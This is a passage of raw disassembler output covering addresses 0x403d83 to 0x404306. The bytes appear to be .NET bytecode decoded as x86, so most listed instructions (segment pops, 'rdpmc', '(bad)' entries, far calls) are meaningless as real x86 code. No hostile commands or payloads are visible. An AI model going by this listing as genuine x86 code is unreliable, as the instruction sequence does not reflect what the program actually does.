  403d83:	2e 0d 17 11 0a 3b    	cs or  $0x3b0a1117,%eax
  403d89:	9b                   	fwait
  403d8a:	01 00                	add    %eax,(%eax)
  403d8c:	00 38                	add    %bh,(%eax)
  403d8e:	12 02                	adc    (%edx),%al
  403d90:	00 00                	add    %al,(%eax)
  403d92:	00 08                	add    %cl,(%eax)
  403d94:	11 09                	adc    %ecx,(%ecx)
  403d96:	58                   	pop    %eax
  403d97:	1f                   	pop    %ds
  403d98:	38 58 11             	cmp    %bl,0x11(%eax)
  403d9b:	04 58                	add    $0x58,%al
  403d9d:	4a                   	dec    %edx
  403d9e:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  403da1:	0c 15                	or     $0x15,%al
  403da3:	2e 39 07             	cmp    %eax,%cs:(%edi)
  403da6:	11 0c 9a             	adc    %ecx,(%edx,%ebx,4)
  403da9:	25 14 33 16 26       	and    $0x26163314,%eax
  403dae:	07                   	pop    %es
  403daf:	11 0c 06             	adc    %ecx,(%esi,%eax,1)
  403db2:	11 0c a3             	adc    %ecx,(%ebx,%eiz,4)
  403db5:	11 00                	adc    %eax,(%eax)
  403db7:	00 01                	add    %al,(%ecx)
  403db9:	28 0d 00 00 0a a2    	sub    %cl,0xa20a0000
  403dbf:	07                   	pop    %es
  403dc0:	11 0c 9a             	adc    %ecx,(%edx,%ebx,4)
  403dc3:	00 11                	add    %dl,(%ecx)
  403dc5:	0e                   	push   %cs
  403dc6:	1a 9a 28 0e 00 00    	sbb    0xe28(%edx),%bl
  403dcc:	0a 2d 0f 08 11 09    	or     0x911080f,%ch
  403dd2:	58                   	pop    %eax
  403dd3:	1f                   	pop    %ds
  403dd4:	40                   	inc    %eax
  403dd5:	58                   	pop    %eax
  403dd6:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403dd9:	4a                   	dec    %edx
  403dda:	13 09                	adc    (%ecx),%ecx
  403ddc:	2b 89 00 11 09 13    	sub    0x13091100(%ecx),%ecx
  403de2:	08 08                	or     %cl,(%eax)
  403de4:	08 11                	or     %dl,(%ecx)
  403de6:	08 58 1e             	or     %bl,0x1e(%eax)
  403de9:	58                   	pop    %eax
  403dea:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403ded:	4a                   	dec    %edx
  403dee:	58                   	pop    %eax
  403def:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403df2:	4a                   	dec    %edx
  403df3:	13 0f                	adc    (%edi),%ecx
  403df5:	11 0e                	adc    %ecx,(%esi)
  403df7:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  403dfc:	00 01                	add    %al,(%ecx)
  403dfe:	13 19                	adc    (%ecx),%ebx
  403e00:	00 11                	add    %dl,(%ecx)
  403e02:	19 11                	sbb    %edx,(%ecx)
  403e04:	0f 33                	rdpmc
  403e06:	7b 08                	jnp    0x403e10
  403e08:	11 08                	adc    %ecx,(%eax)
  403e0a:	58                   	pop    %eax
  403e0b:	1f                   	pop    %ds
  403e0c:	20 58 11             	and    %bl,0x11(%eax)
  403e0f:	04 58                	add    $0x58,%al
  403e11:	4a                   	dec    %edx
  403e12:	13 1a                	adc    (%edx),%ebx
  403e14:	11 0e                	adc    %ecx,(%esi)
  403e16:	1a 9a 13 0d 11 07    	sbb    0x7110d13(%edx),%bl
  403e1c:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  403e22:	1b 13                	sbb    (%ebx),%edx
  403e24:	07                   	pop    %es
  403e25:	1e                   	push   %ds
  403e26:	8d 03                	lea    (%ebx),%eax
  403e28:	00 00                	add    %al,(%eax)
  403e2a:	01 13                	add    %edx,(%ebx)
  403e2c:	1b 11                	sbb    (%ecx),%edx
  403e2e:	1b 17                	sbb    (%edi),%edx
  403e30:	17                   	pop    %ss
  403e31:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403e34:	00 01                	add    %al,(%ecx)
  403e36:	a2 11 1b 18 11       	mov    %al,0x11181b11
  403e3b:	07                   	pop    %es
  403e3c:	a2 11 1b 1a 11       	mov    %al,0x111a1b11
  403e41:	0e                   	push   %cs
  403e42:	1a 9a a2 11 1b 1d    	sbb    0x1d1b11a2(%edx),%bl
  403e48:	11 0e                	adc    %ecx,(%esi)
  403e4a:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  403e4f:	00 01                	add    %al,(%ecx)
  403e51:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403e54:	00 01                	add    %al,(%ecx)
  403e56:	a2 11 1b 1c 11       	mov    %al,0x111c1b11
  403e5b:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  403e62:	11 1b                	adc    %ebx,(%ebx)
  403e64:	19 18                	sbb    %ebx,(%eax)
  403e66:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403e69:	00 01                	add    %al,(%ecx)
  403e6b:	a2 11 1b 13 07       	mov    %al,0x7131b11
  403e70:	08 11                	or     %dl,(%ecx)
  403e72:	08 58 1f             	or     %bl,0x1f(%eax)
  403e75:	20 58 11             	and    %bl,0x11(%eax)
  403e78:	04 58                	add    $0x58,%al
  403e7a:	4a                   	dec    %edx
  403e7b:	13 05 38 41 fd ff    	adc    0xfffd4138,%eax
  403e81:	ff 00                	incl   (%eax)
  403e83:	08 11                	or     %dl,(%ecx)
  403e85:	19 58 1f             	sbb    %ebx,0x1f(%eax)
  403e88:	28 58 11             	sub    %bl,0x11(%eax)
  403e8b:	04 58                	add    $0x58,%al
  403e8d:	4a                   	dec    %edx
  403e8e:	13 1c 11             	adc    (%ecx,%edx,1),%ebx
  403e91:	1c 15                	sbb    $0x15,%al
  403e93:	3b 80 00 00 00 08    	cmp    0x8000000(%eax),%eax
  403e99:	11 1c 58             	adc    %ebx,(%eax,%ebx,2)
  403e9c:	1f                   	pop    %ds
  403e9d:	20 58 11             	and    %bl,0x11(%eax)
  403ea0:	04 58                	add    $0x58,%al
  403ea2:	4a                   	dec    %edx
  403ea3:	13 1a                	adc    (%edx),%ebx
  403ea5:	11 07                	adc    %eax,(%edi)
  403ea7:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  403ead:	1b 13                	sbb    (%ebx),%edx
  403eaf:	07                   	pop    %es
  403eb0:	1e                   	push   %ds
  403eb1:	8d 03                	lea    (%ebx),%eax
  403eb3:	00 00                	add    %al,(%eax)
  403eb5:	01 13                	add    %edx,(%ebx)
  403eb7:	1b 11                	sbb    (%ecx),%edx
  403eb9:	1b 17                	sbb    (%edi),%edx
  403ebb:	17                   	pop    %ss
  403ebc:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403ebf:	00 01                	add    %al,(%ecx)
  403ec1:	a2 11 1b 18 11       	mov    %al,0x11181b11
  403ec6:	07                   	pop    %es
  403ec7:	a2 11 1b 1a 11       	mov    %al,0x111a1b11
  403ecc:	0e                   	push   %cs
  403ecd:	1a 9a a2 11 1b 1d    	sbb    0x1d1b11a2(%edx),%bl
  403ed3:	11 0e                	adc    %ecx,(%esi)
  403ed5:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  403eda:	00 01                	add    %al,(%ecx)
  403edc:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403edf:	00 01                	add    %al,(%ecx)
  403ee1:	a2 11 1b 1c 11       	mov    %al,0x111c1b11
  403ee6:	1c 8c                	sbb    $0x8c,%al
  403ee8:	04 00                	add    $0x0,%al
  403eea:	00 01                	add    %al,(%ecx)
  403eec:	a2 11 1b 16 11       	mov    %al,0x11161b11
  403ef1:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  403ef8:	11 1b                	adc    %ebx,(%ebx)
  403efa:	19 16                	sbb    %edx,(%esi)
  403efc:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403eff:	00 01                	add    %al,(%ecx)
  403f01:	a2 11 1b 13 07       	mov    %al,0x7131b11
  403f06:	08 11                	or     %dl,(%ecx)
  403f08:	1c 58                	sbb    $0x58,%al
  403f0a:	1f                   	pop    %ds
  403f0b:	20 58 11             	and    %bl,0x11(%eax)
  403f0e:	04 58                	add    $0x58,%al
  403f10:	4a                   	dec    %edx
  403f11:	13 05 38 ab fc ff    	adc    0xfffcab38,%eax
  403f17:	ff 00                	incl   (%eax)
  403f19:	08 11                	or     %dl,(%ecx)
  403f1b:	19 58 11             	sbb    %ebx,0x11(%eax)
  403f1e:	04 58                	add    $0x58,%al
  403f20:	4a                   	dec    %edx
  403f21:	13 19                	adc    (%ecx),%ebx
  403f23:	38 d8                	cmp    %bl,%al
  403f25:	fe                   	(bad)
  403f26:	ff                   	(bad)
  403f27:	ff 00                	incl   (%eax)
  403f29:	08 11                	or     %dl,(%ecx)
  403f2b:	09 58 1f             	or     %ebx,0x1f(%eax)
  403f2e:	18 58 11             	sbb    %bl,0x11(%eax)
  403f31:	04 58                	add    $0x58,%al
  403f33:	4a                   	dec    %edx
  403f34:	13 1a                	adc    (%edx),%ebx
  403f36:	11 0e                	adc    %ecx,(%esi)
  403f38:	1a 9a 13 0d 11 07    	sbb    0x7110d13(%edx),%bl
  403f3e:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  403f44:	1b 13                	sbb    (%ebx),%edx
  403f46:	07                   	pop    %es
  403f47:	1e                   	push   %ds
  403f48:	8d 03                	lea    (%ebx),%eax
  403f4a:	00 00                	add    %al,(%eax)
  403f4c:	01 13                	add    %edx,(%ebx)
  403f4e:	1b 11                	sbb    (%ecx),%edx
  403f50:	1b 17                	sbb    (%edi),%edx
  403f52:	17                   	pop    %ss
  403f53:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403f56:	00 01                	add    %al,(%ecx)
  403f58:	a2 11 1b 18 11       	mov    %al,0x11181b11
  403f5d:	07                   	pop    %es
  403f5e:	a2 11 1b 1a 11       	mov    %al,0x111a1b11
  403f63:	0e                   	push   %cs
  403f64:	1a 9a a2 11 1b 1d    	sbb    0x1d1b11a2(%edx),%bl
  403f6a:	11 0e                	adc    %ecx,(%esi)
  403f6c:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  403f71:	00 01                	add    %al,(%ecx)
  403f73:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403f76:	00 01                	add    %al,(%ecx)
  403f78:	a2 11 1b 1c 11       	mov    %al,0x111c1b11
  403f7d:	09 8c 04 00 00 01 a2 	or     %ecx,-0x5dff0000(%esp,%eax,1)
  403f84:	11 1b                	adc    %ebx,(%ebx)
  403f86:	19 17                	sbb    %edx,(%edi)
  403f88:	8c 04 00             	mov    %es,(%eax,%eax,1)
  403f8b:	00 01                	add    %al,(%ecx)
  403f8d:	a2 11 1b 13 07       	mov    %al,0x7131b11
  403f92:	08 11                	or     %dl,(%ecx)
  403f94:	09 58 1f             	or     %ebx,0x1f(%eax)
  403f97:	18 58 11             	sbb    %bl,0x11(%eax)
  403f9a:	04 58                	add    $0x58,%al
  403f9c:	4a                   	dec    %edx
  403f9d:	13 05 38 1f fc ff    	adc    0xfffc1f38,%eax
  403fa3:	ff 00                	incl   (%eax)
  403fa5:	11 07                	adc    %eax,(%edi)
  403fa7:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  403fad:	1b 13                	sbb    (%ebx),%edx
  403faf:	07                   	pop    %es
  403fb0:	11 0e                	adc    %ecx,(%esi)
  403fb2:	1a 9a 13 1d 11 0e    	sbb    0xe111d13(%edx),%bl
  403fb8:	1d 9a a5 04 00       	sbb    $0x4a59a,%eax
  403fbd:	00 01                	add    %al,(%ecx)
  403fbf:	13 1e                	adc    (%esi),%ebx
  403fc1:	2b 00                	sub    (%eax),%eax
  403fc3:	00 11                	add    %dl,(%ecx)
  403fc5:	05 13 09 11 09       	add    $0x9110913,%eax
  403fca:	13 1a                	adc    (%edx),%ebx
  403fcc:	16                   	push   %ss
  403fcd:	13 1f                	adc    (%edi),%ebx
  403fcf:	1a 13                	sbb    (%ebx),%dl
  403fd1:	10 11                	adc    %dl,(%ecx)
  403fd3:	1f                   	pop    %ds
  403fd4:	11 10                	adc    %edx,(%eax)
  403fd6:	58                   	pop    %eax
  403fd7:	18 5b 13             	sbb    %bl,0x13(%ebx)
  403fda:	20 08                	and    %cl,(%eax)
  403fdc:	20 f0                	and    %dh,%al
  403fde:	00 00                	add    %al,(%eax)
  403fe0:	00 58 11             	add    %bl,0x11(%eax)
  403fe3:	20 1f                	and    %bl,(%edi)
  403fe5:	48                   	dec    %eax
  403fe6:	5a                   	pop    %edx
  403fe7:	58                   	pop    %eax
  403fe8:	1e                   	push   %ds
  403fe9:	58                   	pop    %eax
  403fea:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  403fed:	4a                   	dec    %edx
  403fee:	13 21                	adc    (%ecx),%esp
  403ff0:	08 20                	or     %ah,(%eax)
  403ff2:	f0 00 00             	lock add %al,(%eax)
  403ff5:	00 58 11             	add    %bl,0x11(%eax)
  403ff8:	20 1f                	and    %bl,(%edi)
  403ffa:	48                   	dec    %eax
  403ffb:	5a                   	pop    %edx
  403ffc:	58                   	pop    %eax
  403ffd:	1f                   	pop    %ds
  403ffe:	10 58 11             	adc    %bl,0x11(%eax)
  404001:	04 58                	add    $0x58,%al
  404003:	4a                   	dec    %edx
  404004:	13 22                	adc    (%edx),%esp
  404006:	11 1a                	adc    %ebx,(%edx)
  404008:	11 21                	adc    %esp,(%ecx)
  40400a:	11 22                	adc    %esp,(%edx)
  40400c:	58                   	pop    %eax
  40400d:	2f                   	das
  40400e:	0a 11                	or     (%ecx),%dl
  404010:	21 11                	and    %edx,(%ecx)
  404012:	1a 30                	sbb    (%eax),%dh
  404014:	0c 11                	or     $0x11,%al
  404016:	20 2b                	and    %ch,(%ebx)
  404018:	10 11                	adc    %dl,(%ecx)
  40401a:	20 17                	and    %dl,(%edi)
  40401c:	58                   	pop    %eax
  40401d:	13 1f                	adc    (%edi),%ebx
  40401f:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  404025:	13 10                	adc    (%eax),%edx
  404027:	2b a9 00 13 0f 08    	sub    0x80f1300(%ecx),%ebp
  40402d:	20 f0                	and    %dh,%al
  40402f:	00 00                	add    %al,(%eax)
  404031:	00 58 11             	add    %bl,0x11(%eax)
  404034:	0f 1f 48 5a          	nopl   0x5a(%eax)
  404038:	58                   	pop    %eax
  404039:	1f                   	pop    %ds
  40403a:	38 58 11             	cmp    %bl,0x11(%eax)
  40403d:	04 58                	add    $0x58,%al
  40403f:	4a                   	dec    %edx
  404040:	13 08                	adc    (%eax),%ecx
  404042:	11 08                	adc    %ecx,(%eax)
  404044:	13 0c 11             	adc    (%ecx,%edx,1),%ecx
  404047:	0c 13                	or     $0x13,%al
  404049:	19 00                	sbb    %eax,(%eax)
  40404b:	11 07                	adc    %eax,(%edi)
  40404d:	14 33                	adc    $0x33,%al
  40404f:	05 38 95 01 00       	add    $0x19538,%eax
  404054:	00 00                	add    %al,(%eax)
  404056:	11 07                	adc    %eax,(%edi)
  404058:	17                   	pop    %ss
  404059:	9a a5 04 00 00 01 16 	lcall  $0x1601,$0x4a5
  404060:	40                   	inc    %eax
  404061:	b3 00                	mov    $0x0,%bl
  404063:	00 00                	add    %al,(%eax)
  404065:	11 07                	adc    %eax,(%edi)
  404067:	1c 9a                	sbb    $0x9a,%al
  404069:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40406a:	04 00                	add    $0x0,%al
  40406c:	00 01                	add    %al,(%ecx)
  40406e:	11 0c 15 33 06 15 38 	adc    %ecx,0x38150633(,%edx,1)
  404075:	86 00                	xchg   %al,(%eax)
  404077:	00 00                	add    %al,(%eax)
  404079:	00 08                	add    %cl,(%eax)
  40407b:	11 0c 58             	adc    %ecx,(%eax,%ebx,2)
  40407e:	1f                   	pop    %ds
  40407f:	18 58 11             	sbb    %bl,0x11(%eax)
  404082:	04 58                	add    $0x58,%al
  404084:	4a                   	dec    %edx
  404085:	13 23                	adc    (%ebx),%esp
  404087:	16                   	push   %ss
  404088:	13 22                	adc    (%edx),%esp
  40408a:	1a 13                	sbb    (%ebx),%dl
  40408c:	21 11                	and    %edx,(%ecx)
  40408e:	22 11                	and    (%ecx),%dl
  404090:	21 58 18             	and    %ebx,0x18(%eax)
  404093:	5b                   	pop    %ebx
  404094:	13 20                	adc    (%eax),%esp
  404096:	08 20                	or     %ah,(%eax)
  404098:	58                   	pop    %eax
  404099:	02 00                	add    (%eax),%al
  40409b:	00 58 11             	add    %bl,0x11(%eax)
  40409e:	20 1f                	and    %bl,(%edi)
  4040a0:	38 5a 58             	cmp    %bl,0x58(%edx)
  4040a3:	1e                   	push   %ds
  4040a4:	58                   	pop    %eax
  4040a5:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4040a8:	4a                   	dec    %edx
  4040a9:	13 10                	adc    (%eax),%edx
  4040ab:	08 20                	or     %ah,(%eax)
  4040ad:	58                   	pop    %eax
  4040ae:	02 00                	add    (%eax),%al
  4040b0:	00 58 11             	add    %bl,0x11(%eax)
  4040b3:	20 1f                	and    %bl,(%edi)
  4040b5:	38 5a 58             	cmp    %bl,0x58(%edx)
  4040b8:	1f                   	pop    %ds
  4040b9:	10 58 11             	adc    %bl,0x11(%eax)
  4040bc:	04 58                	add    $0x58,%al
  4040be:	4a                   	dec    %edx
  4040bf:	13 1f                	adc    (%edi),%ebx
  4040c1:	11 23                	adc    %esp,(%ebx)
  4040c3:	11 10                	adc    %edx,(%eax)
  4040c5:	11 1f                	adc    %ebx,(%edi)
  4040c7:	58                   	pop    %eax
  4040c8:	2f                   	das
  4040c9:	0a 11                	or     (%ecx),%dl
  4040cb:	10 11                	adc    %dl,(%ecx)
  4040cd:	23 30                	and    (%eax),%esi
  4040cf:	0c 11                	or     $0x11,%al
  4040d1:	20 2b                	and    %ch,(%ebx)
  4040d3:	10 11                	adc    %dl,(%ecx)
  4040d5:	20 17                	and    %dl,(%edi)
  4040d7:	58                   	pop    %eax
  4040d8:	13 22                	adc    (%edx),%esp
  4040da:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  4040e0:	13 21                	adc    (%ecx),%esp
  4040e2:	2b a9 00 13 08 08    	sub    0x8081300(%ecx),%ebp
  4040e8:	20 58 02             	and    %bl,0x2(%eax)
  4040eb:	00 00                	add    %al,(%eax)
  4040ed:	58                   	pop    %eax
  4040ee:	11 08                	adc    %ecx,(%eax)
  4040f0:	1f                   	pop    %ds
  4040f1:	38 5a 58             	cmp    %bl,0x58(%edx)
  4040f4:	1f                   	pop    %ds
  4040f5:	28 58 11             	sub    %bl,0x11(%eax)
  4040f8:	04 58                	add    $0x58,%al
  4040fa:	4a                   	dec    %edx
  4040fb:	13 0f                	adc    (%edi),%ecx
  4040fd:	11 0f                	adc    %ecx,(%edi)
  4040ff:	00 33                	add    %dh,(%ebx)
  404101:	05 38 e3 00 00       	add    $0xe338,%eax
  404106:	00 00                	add    %al,(%eax)
  404108:	11 07                	adc    %eax,(%edi)
  40410a:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  404110:	1b 13                	sbb    (%ebx),%edx
  404112:	07                   	pop    %es
  404113:	38 32                	cmp    %dh,(%edx)
  404115:	ff                   	(bad)
  404116:	ff                   	(bad)
  404117:	ff 00                	incl   (%eax)
  404119:	11 07                	adc    %eax,(%edi)
  40411b:	19 9a a5 04 00 00    	sbb    %ebx,0x4a5(%edx)
  404121:	01 13                	add    %edx,(%ebx)
  404123:	1c 11                	sbb    $0x11,%al
  404125:	1c 18                	sbb    $0x18,%al
  404127:	2e 10 11             	adc    %dl,%cs:(%ecx)
  40412a:	1c 16                	sbb    $0x16,%al
  40412c:	2e 0b 11             	or     %cs:(%ecx),%edx
  40412f:	1c 17                	sbb    $0x17,%al
  404131:	33 05 38 16 fc ff    	xor    0xfffc1638,%eax
  404137:	ff 00                	incl   (%eax)
  404139:	00 11                	add    %dl,(%ecx)
  40413b:	07                   	pop    %es
  40413c:	1c 9a                	sbb    $0x9a,%al
  40413e:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  40413f:	04 00                	add    $0x0,%al
  404141:	00 01                	add    %al,(%ecx)
  404143:	11 0c 15 33 06 15 38 	adc    %ecx,0x38150633(,%edx,1)
  40414a:	86 00                	xchg   %al,(%eax)
  40414c:	00 00                	add    %al,(%eax)
  40414e:	00 08                	add    %cl,(%eax)
  404150:	11 0c 58             	adc    %ecx,(%eax,%ebx,2)
  404153:	1f                   	pop    %ds
  404154:	18 58 11             	sbb    %bl,0x11(%eax)
  404157:	04 58                	add    $0x58,%al
  404159:	4a                   	dec    %edx
  40415a:	13 1a                	adc    (%edx),%ebx
  40415c:	16                   	push   %ss
  40415d:	13 1f                	adc    (%edi),%ebx
  40415f:	1a 13                	sbb    (%ebx),%dl
  404161:	10 11                	adc    %dl,(%ecx)
  404163:	1f                   	pop    %ds
  404164:	11 10                	adc    %edx,(%eax)
  404166:	58                   	pop    %eax
  404167:	18 5b 13             	sbb    %bl,0x13(%ebx)
  40416a:	20 08                	and    %cl,(%eax)
  40416c:	20 58 02             	and    %bl,0x2(%eax)
  40416f:	00 00                	add    %al,(%eax)
  404171:	58                   	pop    %eax
  404172:	11 20                	adc    %esp,(%eax)
  404174:	1f                   	pop    %ds
  404175:	38 5a 58             	cmp    %bl,0x58(%edx)
  404178:	1e                   	push   %ds
  404179:	58                   	pop    %eax
  40417a:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40417d:	4a                   	dec    %edx
  40417e:	13 21                	adc    (%ecx),%esp
  404180:	08 20                	or     %ah,(%eax)
  404182:	58                   	pop    %eax
  404183:	02 00                	add    (%eax),%al
  404185:	00 58 11             	add    %bl,0x11(%eax)
  404188:	20 1f                	and    %bl,(%edi)
  40418a:	38 5a 58             	cmp    %bl,0x58(%edx)
  40418d:	1f                   	pop    %ds
  40418e:	10 58 11             	adc    %bl,0x11(%eax)
  404191:	04 58                	add    $0x58,%al
  404193:	4a                   	dec    %edx
  404194:	13 22                	adc    (%edx),%esp
  404196:	11 1a                	adc    %ebx,(%edx)
  404198:	11 21                	adc    %esp,(%ecx)
  40419a:	11 22                	adc    %esp,(%edx)
  40419c:	58                   	pop    %eax
  40419d:	2f                   	das
  40419e:	0a 11                	or     (%ecx),%dl
  4041a0:	21 11                	and    %edx,(%ecx)
  4041a2:	1a 30                	sbb    (%eax),%dh
  4041a4:	0c 11                	or     $0x11,%al
  4041a6:	20 2b                	and    %ch,(%ebx)
  4041a8:	10 11                	adc    %dl,(%ecx)
  4041aa:	20 17                	and    %dl,(%edi)
  4041ac:	58                   	pop    %eax
  4041ad:	13 1f                	adc    (%edi),%ebx
  4041af:	2b b1 11 20 17 59    	sub    0x59172011(%ecx),%esi
  4041b5:	13 10                	adc    (%eax),%edx
  4041b7:	2b a9 00 13 0f 08    	sub    0x80f1300(%ecx),%ebp
  4041bd:	20 58 02             	and    %bl,0x2(%eax)
  4041c0:	00 00                	add    %al,(%eax)
  4041c2:	58                   	pop    %eax
  4041c3:	11 0f                	adc    %ecx,(%edi)
  4041c5:	1f                   	pop    %ds
  4041c6:	38 5a 58             	cmp    %bl,0x58(%edx)
  4041c9:	1f                   	pop    %ds
  4041ca:	28 58 11             	sub    %bl,0x11(%eax)
  4041cd:	04 58                	add    $0x58,%al
  4041cf:	4a                   	dec    %edx
  4041d0:	13 08                	adc    (%eax),%ecx
  4041d2:	11 08                	adc    %ecx,(%eax)
  4041d4:	00 33                	add    %dh,(%ebx)
  4041d6:	02 2b                	add    (%ebx),%ch
  4041d8:	11 00                	adc    %eax,(%eax)
  4041da:	11 07                	adc    %eax,(%edi)
  4041dc:	18 9a 74 01 00 00    	sbb    %bl,0x174(%edx)
  4041e2:	1b 13                	sbb    (%ebx),%edx
  4041e4:	07                   	pop    %es
  4041e5:	38 60 fe             	cmp    %ah,-0x2(%eax)
  4041e8:	ff                   	(bad)
  4041e9:	ff 00                	incl   (%eax)
  4041eb:	15 11 0c 33 06       	adc    $0x6330c11,%eax
  4041f0:	17                   	pop    %ss
  4041f1:	13 24 11             	adc    (%ecx,%edx,1),%esp
  4041f4:	1d 7a 00 08 11       	sbb    $0x1108007a,%eax
  4041f9:	0c 58                	or     $0x58,%al
  4041fb:	1e                   	push   %ds
  4041fc:	58                   	pop    %eax
  4041fd:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404200:	4a                   	dec    %edx
  404201:	13 0a                	adc    (%edx),%ecx
  404203:	11 0a                	adc    %ecx,(%edx)
  404205:	13 10                	adc    (%eax),%edx
  404207:	00 11                	add    %dl,(%ecx)
  404209:	10 15 33 0f 08 11    	adc    %dl,0x11080f33
  40420f:	0c 58                	or     $0x58,%al
  404211:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  404214:	4a                   	dec    %edx
  404215:	13 0c 38             	adc    (%eax,%edi,1),%ecx
  404218:	2e fe                	cs (bad)
  40421a:	ff                   	(bad)
  40421b:	ff 00                	incl   (%eax)
  40421d:	08 11                	or     %dl,(%ecx)
  40421f:	10 58 1f             	adc    %bl,0x1f(%eax)
  404222:	10 58 11             	adc    %bl,0x11(%eax)
  404225:	04 58                	add    $0x58,%al
  404227:	4a                   	dec    %edx
  404228:	13 21                	adc    (%ecx),%esp
  40422a:	16                   	push   %ss
  40422b:	11 21                	adc    %esp,(%ecx)
  40422d:	2e 17                	cs pop %ss
  40422f:	17                   	pop    %ss
  404230:	11 21                	adc    %esp,(%ecx)
  404232:	3b 7e 01             	cmp    0x1(%esi),%edi
  404235:	00 00                	add    %al,(%eax)
  404237:	08 11                	or     %dl,(%ecx)
  404239:	0c 58                	or     $0x58,%al
  40423b:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40423e:	4a                   	dec    %edx
  40423f:	13 0c 38             	adc    (%eax,%edi,1),%ecx
  404242:	04 fe                	add    $0xfe,%al
  404244:	ff                   	(bad)
  404245:	ff 00                	incl   (%eax)
  404247:	08 11                	or     %dl,(%ecx)
  404249:	10 58 1f             	adc    %bl,0x1f(%eax)
  40424c:	38 58 11             	cmp    %bl,0x11(%eax)
  40424f:	04 58                	add    $0x58,%al
  404251:	4a                   	dec    %edx
  404252:	13 20                	adc    (%eax),%esp
  404254:	11 20                	adc    %esp,(%eax)
  404256:	15 2e 3a 07 11       	adc    $0x11073a2e,%eax
  40425b:	20 9a 25 14 33 16    	and    %bl,0x16331425(%edx)
  404261:	26 07                	es pop %es
  404263:	11 20                	adc    %esp,(%eax)
  404265:	06                   	push   %es
  404266:	11 20                	adc    %esp,(%eax)
  404268:	a3 11 00 00 01       	mov    %eax,0x1000011
  40426d:	28 0d 00 00 0a a2    	sub    %cl,0xa20a0000
  404273:	07                   	pop    %es
  404274:	11 20                	adc    %esp,(%eax)
  404276:	9a 00 11 1d 28 0e 00 	lcall  $0xe,$0x281d1100
  40427d:	00 0a                	add    %cl,(%edx)
  40427f:	2d 12 08 11 10       	sub    $0x10110812,%eax
  404284:	58                   	pop    %eax
  404285:	1f                   	pop    %ds
  404286:	40                   	inc    %eax
  404287:	58                   	pop    %eax
  404288:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  40428b:	4a                   	dec    %edx
  40428c:	13 10                	adc    (%eax),%edx
  40428e:	38 74 ff ff          	cmp    %dh,-0x1(%edi,%edi,8)
  404292:	ff 00                	incl   (%eax)
  404294:	11 10                	adc    %edx,(%eax)
  404296:	13 08                	adc    (%eax),%ecx
  404298:	08 08                	or     %cl,(%eax)
  40429a:	11 08                	adc    %ecx,(%eax)
  40429c:	58                   	pop    %eax
  40429d:	1e                   	push   %ds
  40429e:	58                   	pop    %eax
  40429f:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4042a2:	4a                   	dec    %edx
  4042a3:	58                   	pop    %eax
  4042a4:	11 04 58             	adc    %eax,(%eax,%ebx,2)
  4042a7:	4a                   	dec    %edx
  4042a8:	13 0f                	adc    (%edi),%ecx
  4042aa:	11 19                	adc    %ebx,(%ecx)
  4042ac:	11 1e                	adc    %ebx,(%esi)
  4042ae:	59                   	pop    %ecx
  4042af:	11 1e                	adc    %ebx,(%esi)
  4042b1:	15 fe 01 5a 11       	adc    $0x115a01fe,%eax
  4042b6:	1e                   	push   %ds
  4042b7:	58                   	pop    %eax
  4042b8:	13 23                	adc    (%ebx),%esp
  4042ba:	00 11                	add    %dl,(%ecx)
  4042bc:	23 11                	and    (%ecx),%edx
  4042be:	0f 33                	rdpmc
  4042c0:	65 08 11             	or     %dl,%gs:(%ecx)
  4042c3:	08 58 1f             	or     %bl,0x1f(%eax)
  4042c6:	20 58 11             	and    %bl,0x11(%eax)
  4042c9:	04 58                	add    $0x58,%al
  4042cb:	4a                   	dec    %edx
  4042cc:	13 1f                	adc    (%edi),%ebx
  4042ce:	11 1d 13 0d 1e 8d    	adc    %ebx,0x8d1e0d13
  4042d4:	03 00                	add    (%eax),%eax
  4042d6:	00 01                	add    %al,(%ecx)
  4042d8:	13 0e                	adc    (%esi),%ecx
  4042da:	11 0e                	adc    %ecx,(%esi)
  4042dc:	17                   	pop    %ss
  4042dd:	17                   	pop    %ss
  4042de:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4042e1:	00 01                	add    %al,(%ecx)
  4042e3:	a2 11 0e 18 11       	mov    %al,0x11180e11
  4042e8:	07                   	pop    %es
  4042e9:	a2 11 0e 1a 11       	mov    %al,0x111a0e11
  4042ee:	1d a2 11 0e 1d       	sbb    $0x1d0e11a2,%eax
  4042f3:	11 19                	adc    %ebx,(%ecx)
  4042f5:	8c 04 00             	mov    %es,(%eax,%eax,1)
  4042f8:	00 01                	add    %al,(%ecx)
  4042fa:	a2 11 0e 1c 11       	mov    %al,0x111c0e11
  4042ff:	08 8c 04 00 00 01 a2 	or     %cl,-0x5dff0000(%esp,%eax,1)
  404306:	11 0e                	adc    %ecx,(%esi)
